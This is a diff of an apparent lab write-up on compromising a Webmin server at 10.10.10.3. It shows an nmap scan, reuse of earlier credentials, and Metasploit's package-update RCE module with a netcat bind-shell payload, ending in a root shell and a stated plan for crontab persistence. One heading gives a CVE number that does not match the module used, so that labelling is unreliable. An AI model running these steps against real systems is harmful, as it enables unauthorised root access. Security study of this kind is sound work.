@@ -308,39 +308,45 @@ The target network `10.10.10.0/24` is directly reachable through the VPN tunnel 
 ![[Pasted image 20250513132613.png]]
 
 After listing and performing different types of scan we can identify a route to advance
+
 ![[Pasted image 20250512181147.png]]
 
 # Exploitation through the second network interface
 
 # Nmap
 
-
 ```python
 sudo nmap -p- -sCV --open -Pn -n 10.10.10.3
 ```
 
 We can identify a vulnerability in port 10000/TCP Open HTTP Miniserv 1.953 (Webmin HTTPD)
+
 ![[Pasted image 20250512192250.png]]
 
 We verify the web and we have a login panel in which we tested the credentials that we get previously and get access to the web
+
 ![[Pasted image 20250513134446.png]]
 
 webmin dashboard
+
 ![[Pasted image 20250513134631.png]]
 
 We perform a search and find that this service is vulnerable to Package Updates Remote Command Execution
 
 searched for exploits related to Webmin. 
+
 ```pyhton
 search webmin
 ```
 
 I found an exploit that works very well.
+
 ```python
 use exploit/linux/http/webmin_packageup_rce
 ```
 
 We used the previously discovered credentials to configure the exploit.
+
 ```python
 > set USERNAME support 
 ```
@@ -362,24 +368,27 @@ We used the previously discovered credentials to configure the exploit.
 ```
 
 enabled SSL.
+
 ```python
 msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true
 ```
 
 It’s important to use this specific payload, as the others caused errors when attempting to upgrade the shell.
+
 ```python
 msf6 exploit(linux/http/webmin_packageup_rce) > set payload cmd/unix/bind_netcat
 ```
-
 
 ![[Pasted image 20250513135727.png]]
 
 # Remote Code Execution (RCE) in Webmin - CVE-2019-15107
 
 We successfully received a root shell
+
 ![[Pasted image 20250512192320.png]]
 
 We upgraded to a bash shell
+
 ![[Pasted image 20250512192545.png]]
 
 We are going to obtain a persistence creating a crontab task that executes a root shell every minute
